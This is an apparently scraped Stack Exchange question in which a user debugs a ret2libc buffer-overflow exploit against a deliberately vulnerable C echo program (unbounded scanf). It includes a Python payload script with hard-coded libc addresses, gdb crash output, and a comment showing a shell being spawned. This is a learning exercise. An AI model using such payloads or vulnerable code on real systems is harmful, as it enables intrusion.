{
  "title": "ret2libc exploit issue",
  "link": "https://reverseengineering.stackexchange.com/questions/25871/ret2libc-exploit-issue",
  "content": "i have some code in c i am working to write exploit for it:\n\n```\n#include <stdio.h>    \nvoid secretFunction()\n{\n            printf(\"Congratulations!  \n\");\n            printf(\"You have entered in the secret function!  \n\");\n}\n\nvoid echo()\n{\n            char buffer[20];\n            printf(\"Enter some text:  \n\");\n            scanf(\"%s\", buffer);\n            printf(\"You entered: %s  \n\", buffer);\n}\n\nint main()\n{\n            echo();\n            return 0;\n}\n\n```\nand i wrote the exploit script in python:\n\n```\n#!/bin/env python\nimport struct\nsystem_addr = struct.pack(\"<I\", 0xb7e1d200)\nshell_addr = struct.pack(\"<I\", 0xb7f5e0cf)\nexit_addr = struct.pack(\"<I\", 0xb7deeaac)\nbuf = \"A\" * 32\nbuf += system_addr\nbuf += exit_addr\nbuf += shell_addr\nprint buf\n\n```\nin gdb:\ngdb-peda$ r <<< $(python exploit_scanf.py)\n\nit gave me:\n\n```\n[----------------------------------registers-----------------------------------]\nEAX: 0x38 ('8')\nEBX: 0x42424242 ('BBBB')\nECX: 0x0\nEDX: 0xb7fb9890 --> 0x0\nESI: 0xb7fb8000 --> 0x1d7d6c\nEDI: 0x0\nEBP: 0xd2424242\nESP: 0xbffff470 --> 0xe0cfb7de\nEIP: 0xeaacb7e1\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0xeaacb7e1\n[------------------------------------stack-------------------------------------]\n0000| 0xbffff470 --> 0xe0cfb7de\n0004| 0xbffff474 --> 0xbf00b7f5\n0008| 0xbffff478 --> 0x0\n0012| 0xbffff47c --> 0xb7df8e81 (<__libc_start_main+241>:       add    esp,0x10)\n0016| 0xbffff480 --> 0xb7fb8000 --> 0x1d7d6c\n0020| 0xbffff484 --> 0xb7fb8000 --> 0x1d7d6c\n0024| 0xbffff488 --> 0x0\n0028| 0xbffff48c --> 0xb7df8e81 (<__libc_start_main+241>:       add    esp,0x10)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0xeaacb7e1 in ?? ()\n\n```\nand sometimes it gave me:\n\n```\n/bin/bash: warning: command substitution: ignored null byte in input\n\n```\nand no redirect to shell , what is the issue with ret2libc exploit?\n\n",
  "votes": "0",
  "answers": 0,
  "views": "100",
  "tags": [
    "gdb"
  ],
  "user": "abdullah",
  "time": "Sep 13, 2020 at 13:56",
  "comments": [
    {
      "user": "Paweł Łukasik",
      "text": "try saving the output from the script into a file an then redirect it via r < input in gdb. Will it give the same bash errors?",
      "time": null
    },
    {
      "user": "abdullah",
      "text": "gdb-peda$ r < exp.md Starting program: /home/mal/buffer_overflow_lab/01_stack_overflow_scanf_example < exp.md Enter some text: You entered: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB [New process 26043] process 26043 is executing new program: /bin/dash [New process 26285] process 26285 is executing new program: /bin/dash [Inferior 3 (process 26285) exited normally] Warning: not running or target is remote",
      "time": null
    }
  ],
  "answers_data": []
}